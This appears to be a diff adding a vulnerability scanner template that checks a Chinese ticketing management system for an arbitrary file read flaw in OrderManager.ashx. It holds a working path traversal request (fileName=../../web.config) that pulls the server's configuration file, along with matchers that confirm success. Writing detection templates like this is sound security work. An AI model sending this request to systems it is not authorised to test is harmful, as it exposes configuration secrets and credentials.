@@ -1,0 +1,27 @@
+id: zckx-ordermanager-ashx-anyfile-read
+info:
+  name: 中成科信票务管理系统 OrderManager.ashx 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/SystemManager/OrderManager/OrderManager.ashx?Method=DownTemplate&fileName=../../web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "web.config"
+          - "zckx"
+          - "</system.web>"
+          - "<configuration>"
+        part: body
+      - type: word
+        words:
+          - "text/plain"
+        part: header
+        condition: or
